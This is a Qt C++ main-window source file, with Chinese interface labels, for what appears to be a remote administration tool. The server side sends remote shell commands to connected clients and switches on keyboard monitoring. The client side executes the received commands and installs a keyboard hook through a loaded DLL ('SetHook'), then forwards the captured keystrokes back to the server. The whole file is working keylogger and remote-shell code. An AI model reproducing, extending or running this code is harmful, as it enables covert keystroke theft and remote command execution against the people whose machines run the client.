#include "mainwindow.h"
#include "ui_mainwindow.h"

#include<QDebug>

MainWindow::MainWindow(QWidget *parent)
    : QMainWindow(parent)
    , ui(new Ui::MainWindow)
{
    ui->setupUi(this);

    keyBoardMnt = NULL;
    cmdMnt = NULL;
    cmdThread = NULL;
}

MainWindow::~MainWindow()
{
    netClient->close();
    delete ui;
}

bool MainWindow::nativeEvent(const QByteArray &eventType, void *message, long *result)
{
    MSG* msg = (MSG*) message;
    if(msg->message == WM_COPYDATA){
        COPYDATASTRUCT * p = reinterpret_cast<COPYDATASTRUCT*>(msg->lParam);
        netClient->send(common::packetType::keyHook, static_cast<char *>(p->lpData));
    }
    return QMainWindow::nativeEvent(eventType, message, result);
}

void MainWindow::on_CMDButton_clicked()
{
    QList<QListWidgetItem*> itemList = ui->listWidget->selectedItems();
    QListWidgetItem* item = nullptr;
    if(itemList.length() == 1)item = (ui->listWidget->selectedItems())[0];
    else {
        ui->statusbar->showMessage("未选中或选中多个已连接Socket");
        return;
    }
    int index = ui->listWidget->row(item);
    if(ui->CMDButton->text() == "CMD控制"){
        char data[256] = "on";
        netServer->send(index, common::packetType::cmd, data);
        if(cmdMnt == NULL){
            cmdMnt = new CMDMnt();
            cmdMnt->setIndex(index);
            connect(cmdMnt, &CMDMnt::exctCMD, this, &MainWindow::on_exctCMD);
        }
        cmdMnt->show();
        ui->CMDButton->setText("关闭");
    }else if(ui->CMDButton->text() == "关闭"){
        char data[256] = "off";
        netServer->send(index, common::packetType::cmd, data);
        ui->CMDButton->setText("CMD控制");
    }
}

void MainWindow::on_hookButton_clicked()
{
    QList<QListWidgetItem*> itemList = ui->listWidget->selectedItems();
    QListWidgetItem* item = nullptr;
    if(itemList.length() == 1)item = (ui->listWidget->selectedItems())[0];
    else {
        ui->statusbar->showMessage("未选中或选中多个已连接Socket");
        return;
    }
    int index = ui->listWidget->row(item);
    if(ui->hookButton->text() == "键盘监控"){
        char data[256] = "on";
        netServer->send(index, common::packetType::keyHook, data);
        if(keyBoardMnt == NULL)keyBoardMnt = new KeyBoardMnt();
        keyBoardMnt->show();
        ui->hookButton->setText("关闭");
    }else if(ui->hookButton->text() == "关闭"){
        char data[256] = "off";
        netServer->send(index, common::packetType::keyHook, data);
        ui->hookButton->setText("键盘监控");
    }

}

void MainWindow::on_startServer_clicked()
{
    int port = ui->serverPort->text().toInt();
    int interval = ui->serverInterval->text().toUInt();
    int maxClient = ui->serverMaxClient->text().toInt();
    this->netServer = new NetServer(port, interval, maxClient);
    //TODO 判断是否出现问题
    connect(netServer, &NetServer::newClient, this, &MainWindow::on_newClient);
    connect(netServer, &NetServer::disClient, this, &MainWindow::on_disClient);
    connect(netServer, &NetServer::readData, this, &MainWindow::dispatchServerData);
    ui->statusbar->showMessage("服务端：启动成功");
    ui->serverPort->setEnabled(false);
    ui->serverInterval->setEnabled(false);
    ui->serverMaxClient->setEnabled(false);
    ui->startServer->setEnabled(false);
}

void MainWindow::on_newClient(QTcpSocket *socket)
{
    QString ip = socket->peerAddress().toString();
    ui->listWidget->addItem(ip);
    ui->statusbar->showMessage("服务端："+ip+"连接");
}

void MainWindow::on_disClient(int index)
{
    QListWidgetItem *item = ui->listWidget->takeItem(index);
    QString ip = item->text();
    delete item;
    ui->statusbar->showMessage("服务端："+ip+"断开");
}

void MainWindow::on_clientConnect_clicked()
{
    if(ui->clientConnect->text() == "连接"){
        QString ip = ui->connectIP->text();
        int port = ui->connectPort->text().toInt();
        netClient = new NetClient(ip, port);
        //TODO 连接失败
        connect(netClient, &NetClient::readData, this, &MainWindow::dispatchClientData);
        ui->clientConnect->setText("断开");
    }else if(ui->clientConnect->text() == "断开"){
        netClient->close();
        ui->clientConnect->setText("连接");
    }
}

void MainWindow::on_exctCMD(char *data)
{
    CMDMnt* mnt = (CMDMnt*) sender();
    int index = mnt->getIndex();
    netServer->send(index, common::packetType::cmd, data);
}

void MainWindow::on_client_send_data(int type, QString data)
{
    QByteArray ba = data.toUtf8();
    char *data2=ba.data();
    netClient->send((common::packetType)type, data2);
}

void MainWindow::dispatchClientData(common::UPacket *packet)
{
    switch (packet->type) {
    case common::packetType::cmd:
        if(QString(packet->data) == "on")client_CMD(true);
        else if(QString(packet->data) == "off")client_CMD(false);
        else cmdThread->exctCMD(packet->data);
        break;
    case common::packetType::keyHook:
        if(QString(packet->data) == "on")client_KeyHook(true);
        else if(QString(packet->data) == "off")client_KeyHook(false);
        break;
    }
    delete packet;
    packet = NULL;
}

void MainWindow::dispatchServerData(common::UPacket *packet)
{
    switch (packet->type) {
    case common::packetType::cmd:
        cmdMnt->appentText(packet->data);
        break;
    case common::packetType::keyHook:
        keyBoardMnt->appentText(packet->data);
        break;
    }
    delete packet;
    packet = NULL;
}

void MainWindow::client_CMD(bool on_off)
{
    if(on_off){
        if(cmdThread == NULL){
            cmdThread = new CMDThread();
            connect(cmdThread, &CMDThread::client_send_data, this, &MainWindow::on_client_send_data);
        }
        else cmdThread->startThread();
    }else{
        cmdThread->closeThread();
    }
}

void MainWindow::client_KeyHook(bool on_off)
{
    if(on_off){
        typedef bool (*FUNC)(HWND hWnd);
        hookLib = new QLibrary(common::HOOKDLLPATH);
        hookLib->load();
        FUNC func = (FUNC)hookLib->resolve("SetHook");
        func((HWND)this->winId());
    }else{
        typedef bool (*FUNC)();
        FUNC func = (FUNC)hookLib->resolve("UnHook");
        func();
        hookLib->unload();
    }
}
